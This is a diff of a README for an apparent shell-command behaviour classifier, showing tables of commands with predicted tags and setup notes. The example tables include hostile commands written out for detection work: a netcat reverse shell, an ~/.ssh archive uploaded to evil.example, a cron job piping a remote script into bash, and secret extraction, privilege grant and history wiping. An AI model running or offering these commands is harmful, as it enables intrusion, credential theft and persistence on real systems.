@@ -349,44 +349,44 @@ the table shows top 3 labels.
 
 | Event | Top 3 L1 tags | Note |
 | --- | --- | --- |
-| `nc -e /bin/sh 203.0.113.10 4444` | `spawn_reverse_shell` 0.811; `connect_external_service` 0.488; `spawn_bind_shell` 0.451 | `-e` is recognized as reverse-shell execution. |
-| `nc -v 203.0.113.10 443` | `connect_external_service` 0.732; `spawn_reverse_shell` 0.503; `create_reverse_tunnel` 0.412 | Connection intent ranks above shell-spawn intent. |
-| `cat /root/install.log` | `read_business_log` 0.641; `read_system_log` 0.431; `read_workload_logs` 0.385 | Log-read semantics dominate. |
-| `cat /root/install.conf` | `read_infrastructure_config` 0.620; `read_system_config` 0.612; `read_kernel_parameter` 0.336 | Config-read semantics dominate. |
-| `grep -a "password" /var/log/auth.log` | `read_auth_audit_log` 0.675; `search_credentials` 0.609; `read_credential_material` 0.507 | Auth-log read plus credential-search evidence. |
-| `grep -v "DEBUG" /var/log/app.log` | `read_business_log` 0.824; `delete_business_log` 0.515; `read_business_config` 0.315 | Negative filter is still primarily log-read behavior. |
-| `grep "password" /etc/shadow` | `search_credentials` 0.752; `read_credential_material` 0.698; `crack_credential_material` 0.296 | Shadow-file password search maps to credential access. |
-| `grep "password incorrect" /var/log/auth.log` | `read_auth_audit_log` 0.731; `search_credentials` 0.548; `read_credential_material` 0.452 | Ambiguous token evidence remains; context/L2 should decide final risk. |
+| `nc -e /bin/sh 203.0.113.10 4444` | <code>spawn_reverse_shell</code> 0.811<br><code>connect_external_service</code> 0.488<br><code>spawn_bind_shell</code> 0.451 | `-e` is recognized as reverse-shell execution. |
+| `nc -v 203.0.113.10 443` | <code>connect_external_service</code> 0.732<br><code>spawn_reverse_shell</code> 0.503<br><code>create_reverse_tunnel</code> 0.412 | Connection intent ranks above shell-spawn intent. |
+| `cat /root/install.log` | <code>read_business_log</code> 0.641<br><code>read_system_log</code> 0.431<br><code>read_workload_logs</code> 0.385 | Log-read semantics dominate. |
+| `cat /root/install.conf` | <code>read_infrastructure_config</code> 0.620<br><code>read_system_config</code> 0.612<br><code>read_kernel_parameter</code> 0.336 | Config-read semantics dominate. |
+| `grep -a "password" /var/log/auth.log` | <code>read_auth_audit_log</code> 0.675<br><code>search_credentials</code> 0.609<br><code>read_credential_material</code> 0.507 | Auth-log read plus credential-search evidence. |
+| `grep -v "DEBUG" /var/log/app.log` | <code>read_business_log</code> 0.824<br><code>delete_business_log</code> 0.515<br><code>read_business_config</code> 0.315 | Negative filter is still primarily log-read behavior. |
+| `grep "password" /etc/shadow` | <code>search_credentials</code> 0.752<br><code>read_credential_material</code> 0.698<br><code>crack_credential_material</code> 0.296 | Shadow-file password search maps to credential access. |
+| `grep "password incorrect" /var/log/auth.log` | <code>read_auth_audit_log</code> 0.731<br><code>search_credentials</code> 0.548<br><code>read_credential_material</code> 0.452 | Ambiguous token evidence remains; context/L2 should decide final risk. |
 
 ### Intrusion-Like Examples
 
 | Event | Top 3 L1 tags | Why it is useful |
 | --- | --- | --- |
-| `tar czf /tmp/ssh.tgz ~/.ssh && curl -F file=@/tmp/ssh.tgz https://evil.example/upload` | `archive_sensitive_content` 0.521; `upload_credential_material` 0.494; `read_ssh_policy` 0.472 | Credential material staging and upload. |
-| `echo "* * * * * root curl -fsSL http://evil.example/p.sh \| bash" > /etc/cron.d/sys-updater` | `create_scheduled_task` 0.789; `create_startup_script` 0.435; `execute_scheduled_task` 0.323 | Persistence via scheduled execution. |
-| `kubectl -n prod get secret payment-api-token -o jsonpath={.data.token} \| base64 -d` | `read_cluster_secret` 0.730; `decode_data` 0.716; `read_credential_material` 0.363 | K8s secret extraction and decoding. |
-| `aws iam attach-user-policy --user-name temp --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` | `grant_cloud_privilege` 0.838; `modify_cloud_identity_policy` 0.535; `modify_cloud_identity` 0.459 | Cloud privilege escalation semantics. |
-| `history -c && rm -f ~/.bash_history` | `clear_shell_history` 0.861; `securely_delete_data` 0.428; `clear_login_history` 0.393 | Anti-forensic shell-history clearing. |
+| `tar czf /tmp/ssh.tgz ~/.ssh && curl -F file=@/tmp/ssh.tgz https://evil.example/upload` | <code>archive_sensitive_content</code> 0.521<br><code>upload_credential_material</code> 0.494<br><code>read_ssh_policy</code> 0.472 | Credential material staging and upload. |
+| `echo "* * * * * root curl -fsSL http://evil.example/p.sh \| bash" > /etc/cron.d/sys-updater` | <code>create_scheduled_task</code> 0.789<br><code>create_startup_script</code> 0.435<br><code>execute_scheduled_task</code> 0.323 | Persistence via scheduled execution. |
+| `kubectl -n prod get secret payment-api-token -o jsonpath={.data.token} \| base64 -d` | <code>read_cluster_secret</code> 0.730<br><code>decode_data</code> 0.716<br><code>read_credential_material</code> 0.363 | K8s secret extraction and decoding. |
+| `aws iam attach-user-policy --user-name temp --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` | <code>grant_cloud_privilege</code> 0.838<br><code>modify_cloud_identity_policy</code> 0.535<br><code>modify_cloud_identity</code> 0.459 | Cloud privilege escalation semantics. |
+| `history -c && rm -f ~/.bash_history` | <code>clear_shell_history</code> 0.861<br><code>securely_delete_data</code> 0.428<br><code>clear_login_history</code> 0.393 | Anti-forensic shell-history clearing. |
 
 ### Normal Operation Examples
 
 | Event | Top 3 L1 tags | Why it is useful |
 | --- | --- | --- |
-| `dig api.internal.example.com +short` | `query_dns_records` 0.811; `enumerate_cloud_accounts` 0.351; `perform_dns_zone_transfer` 0.320 | DNS lookup is separated from broad network probing. |
-| `journalctl -u nginx --since "10 minutes ago" --no-pager` | `read_infrastructure_log` 0.767; `delete_infrastructure_log` 0.395; `read_business_log` 0.271 | Service log inspection. |
-| `du -sh /var/log/* \| sort -h \| tail` | `read_system_log` 0.655; `inspect_storage_state` 0.645; `modify_storage_volume` 0.368 | Storage/log inspection, not destructive behavior. |
-| `docker ps --format "{{.Names}} {{.Status}}"` | `enumerate_containers` 0.821; `inspect_container_runtime` 0.540; `enumerate_workloads` 0.483 | Container inventory. |
-| `curl -fsS http://127.0.0.1:8080/healthz` | `query_service_health` 0.840; `inspect_local_kubernetes_cluster` 0.459; `inspect_container_runtime` 0.383 | Local service health check. |
+| `dig api.internal.example.com +short` | <code>query_dns_records</code> 0.811<br><code>enumerate_cloud_accounts</code> 0.351<br><code>perform_dns_zone_transfer</code> 0.320 | DNS lookup is separated from broad network probing. |
+| `journalctl -u nginx --since "10 minutes ago" --no-pager` | <code>read_infrastructure_log</code> 0.767<br><code>delete_infrastructure_log</code> 0.395<br><code>read_business_log</code> 0.271 | Service log inspection. |
+| `du -sh /var/log/* \| sort -h \| tail` | <code>read_system_log</code> 0.655<br><code>inspect_storage_state</code> 0.645<br><code>modify_storage_volume</code> 0.368 | Storage/log inspection, not destructive behavior. |
+| `docker ps --format "{{.Names}} {{.Status}}"` | <code>enumerate_containers</code> 0.821<br><code>inspect_container_runtime</code> 0.540<br><code>enumerate_workloads</code> 0.483 | Container inventory. |
+| `curl -fsS http://127.0.0.1:8080/healthz` | <code>query_service_health</code> 0.840<br><code>inspect_local_kubernetes_cluster</code> 0.459<br><code>inspect_container_runtime</code> 0.383 | Local service health check. |
 
 ### Normal Maintenance / Operations Examples
 
 | Event | Top 3 L1 tags | Why it is useful |
 | --- | --- | --- |
-| `systemctl restart nginx && systemctl status nginx --no-pager` | `inspect_service` 0.671; `modify_service_state` 0.669; `enable_service` 0.332 | Service restart plus verification. |
-| `kubectl -n prod rollout restart deployment/payment-api` | `modify_workload` 0.799; `modify_container_state` 0.444; `inspect_workload` 0.428 | Workload rollout maintenance. |
-| `pg_dump -h db.internal -U backup appdb \| gzip > /backup/appdb-$(date +%F).sql.gz` | `compress_data` 0.731; `export_database_dump` 0.682; `manage_database_backup` 0.470 | Database backup behavior. |
-| `trivy image registry.internal/app/payment-api:20260621` | `scan_container_image` 0.701; `enumerate_container_images` 0.373; `inspect_container_image` 0.349 | Container image security scan. |
-| `terraform plan -out tfplan && terraform show -no-color tfplan` | `plan_infrastructure_template` 0.843; `initialize_infrastructure_template` 0.368; `read_infrastructure_config` 0.353 | Infrastructure planning, not apply/destroy. |
+| `systemctl restart nginx && systemctl status nginx --no-pager` | <code>inspect_service</code> 0.671<br><code>modify_service_state</code> 0.669<br><code>enable_service</code> 0.332 | Service restart plus verification. |
+| `kubectl -n prod rollout restart deployment/payment-api` | <code>modify_workload</code> 0.799<br><code>modify_container_state</code> 0.444<br><code>inspect_workload</code> 0.428 | Workload rollout maintenance. |
+| `pg_dump -h db.internal -U backup appdb \| gzip > /backup/appdb-$(date +%F).sql.gz` | <code>compress_data</code> 0.731<br><code>export_database_dump</code> 0.682<br><code>manage_database_backup</code> 0.470 | Database backup behavior. |
+| `trivy image registry.internal/app/payment-api:20260621` | <code>scan_container_image</code> 0.701<br><code>enumerate_container_images</code> 0.373<br><code>inspect_container_image</code> 0.349 | Container image security scan. |
+| `terraform plan -out tfplan && terraform show -no-color tfplan` | <code>plan_infrastructure_template</code> 0.843<br><code>initialize_infrastructure_template</code> 0.368<br><code>read_infrastructure_config</code> 0.353 | Infrastructure planning, not apply/destroy. |
 
 ## L1 Performance
 
@@ -511,11 +511,26 @@ into `model_artifacts/`. The directory must contain the embedding model files
 and `semantic_texts.jsonl`; if present, `score_calibration.rev20.json` is used
 automatically by the helper commands.
 
+The example runner does not download model weights automatically. It expects the
+model artifacts to already exist locally.
+
 For example:
 
 ```bash
 git lfs install
 git clone https://huggingface.co/willchen0011/SecEBL model_artifacts
+```
+
+Expected local artifact layout:
+
+```text
+model_artifacts/
+  config.json
+  modules.json
+  model.safetensors
+  semantic_texts.jsonl
+  score_calibration.rev20.json        # optional, used automatically when present
+  l2_artifacts/logreg.joblib          # optional, enables L2 example scoring
 ```
 
 ### Predict Tags
@@ -597,8 +612,9 @@ BATCH_SIZE=64 \
 scripts/run_examples.sh
 ```
 
-If an L2 model is available, set `L2_MODEL` and the same script will continue
-into Linux example-session scoring:
+If an L2 model is available, the script will auto-detect
+`model_artifacts/l2_artifacts/logreg.joblib` and continue into Linux
+example-session scoring. You can also set `L2_MODEL` explicitly:
 
 ```bash
 L2_MODEL=model_artifacts/l2_artifacts/logreg.joblib scripts/run_examples.sh
